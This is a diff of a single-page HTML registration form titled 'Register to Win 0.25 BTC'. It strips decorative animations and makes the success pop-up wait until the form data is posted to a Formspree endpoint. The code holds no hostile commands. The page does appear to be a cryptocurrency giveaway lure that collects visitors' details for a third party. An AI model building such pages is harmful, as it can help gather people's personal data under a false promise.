@@ -20,65 +20,6 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
-            position: relative;
-        }
-
-        /* Adding background animation */
-        .background-animation {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            overflow: hidden;
-        }
-
-        .background-animation div {
-            position: absolute;
-            display: block;
-            width: 20px;
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            animation: float 20s infinite ease-in-out;
-            border-radius: 50%;
-        }
-
-        .background-animation div:nth-child(1) {
-            top: 10%;
-            left: 20%;
-            animation-duration: 18s;
-            width: 50px;
-            height: 50px;
-        }
-
-        .background-animation div:nth-child(2) {
-            top: 60%;
-            left: 70%;
-            animation-duration: 22s;
-            width: 30px;
-            height: 30px;
-        }
-
-        .background-animation div:nth-child(3) {
-            top: 80%;
-            left: 30%;
-            animation-duration: 15s;
-            width: 40px;
-            height: 40px;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(0) scale(1);
-            }
-            50% {
-                transform: translateY(-50px) scale(1.1);
-            }
-            100% {
-                transform: translateY(0) scale(1);
-            }
         }
 
         .container {
@@ -87,20 +28,8 @@
             width: 100%;
             padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
             text-align: center;
-            animation: popIn 1s ease-in-out;
-        }
-
-        @keyframes popIn {
-            0% {
-                transform: scale(0.7);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
         }
 
         h1 {
@@ -126,12 +55,11 @@
             font-size: 16px;
             border: 2px solid #ddd;
             border-radius: 8px;
-            transition: border-color 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+            transition: border-color 0.3s ease-in-out;
         }
 
         input:focus, textarea:focus {
             border-color: #4ca1af;
-            box-shadow: 0 0 10px rgba(76, 161, 175, 0.3);
             outline: none;
         }
 
@@ -148,12 +76,11 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: background 0.3s ease-in-out, transform 0.3s ease-in-out;
+            transition: background 0.3s ease-in-out;
         }
 
         button:hover {
             background: linear-gradient(135deg, #2c3e50, #4ca1af);
-            transform: translateY(-3px);
         }
 
         /* Success Pop-up */
@@ -168,7 +95,6 @@
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
             text-align: center;
             display: none;
-            animation: popIn 0.5s ease-in-out;
         }
 
         #success-popup h2 {
@@ -187,7 +113,6 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background 0.3s ease-in-out;
         }
 
         #close-popup:hover {
@@ -204,12 +129,6 @@
     </style>
 </head>
 <body>
-
-    <div class="background-animation">
-        <div></div>
-        <div></div>
-        <div></div>
-    </div>
 
     <div class="container">
         <h1>Register to Win 0.25 BTC</h1>
@@ -232,16 +151,14 @@
     </div>
 
     <script>
+        // Handle form submission via AJAX
         document.getElementById('registration-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form redirect
-
-            // Show the success pop-up immediately
-            document.getElementById('success-popup').style.display = 'block';
+            event.preventDefault(); // Prevent the form from redirecting
 
             // Capture the form data
             var formData = new FormData(this);
 
-            // Send the data via Fetch API in the background
+            // Send the data via Fetch API
             fetch('https://formspree.io/f/xdknvbop', {
                 method: 'POST',
                 body: formData,
@@ -250,7 +167,10 @@
                 }
             })
             .then(function(response) {
-                if (!response.ok) {
+                if (response.ok) {
+                    // Show the success pop-up
+                    document.getElementById('success-popup').style.display = 'block';
+                } else {
                     alert('Oops! Something went wrong. Please try again.');
                 }
             })
@@ -262,9 +182,12 @@
         // Handle closing the pop-up
         document.getElementById('close-popup').addEventListener('click', function() {
             document.getElementById('success-popup').style.display = 'none';
-            document.getElementById('registration-form').reset(); // Optionally clear the form
+            // Optionally, you can clear the form
+            document.getElementById('registration-form').reset();
         });
     </script>
 
 </body>
 </html>
+
+
